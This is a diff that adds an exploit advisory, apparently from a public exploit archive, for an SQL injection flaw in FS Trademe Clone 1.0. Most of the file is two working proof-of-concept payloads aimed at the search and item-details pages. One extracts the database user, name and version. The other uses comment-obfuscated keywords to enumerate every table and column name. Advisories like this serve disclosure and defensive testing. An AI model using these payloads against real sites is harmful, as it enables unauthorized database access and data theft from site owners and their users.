@@ -1,0 +1,36 @@
+# # # # # 
+# Exploit Title: FS Trademe Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/trademe-clone/
+# Demo: http://trademe-clone.demonstration.co.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/search_item.php?search=[SQL]
+# 
+# s'++UNION+ALL+SELECT+1,2,3,4,5,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),7,8,9,10,11,12,13,14--+-
+# 
+# http://server/search_item.php?search=s'++UNION+ALL+SELECT+1,2,3,4,5,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),7,8,9,10,11,12,13,14--+-
+# 
+# 2)
+# http://localhost/[PATH]/general_item_details.php?id=[SQL]
+# 
+# -34++UNION+ALL+SELECT+(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2))--+-
+# 
+# http://server/general_item_details.php?id=-34++UNION+ALL+SELECT+(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2))--+-
+# 
+# # # # #
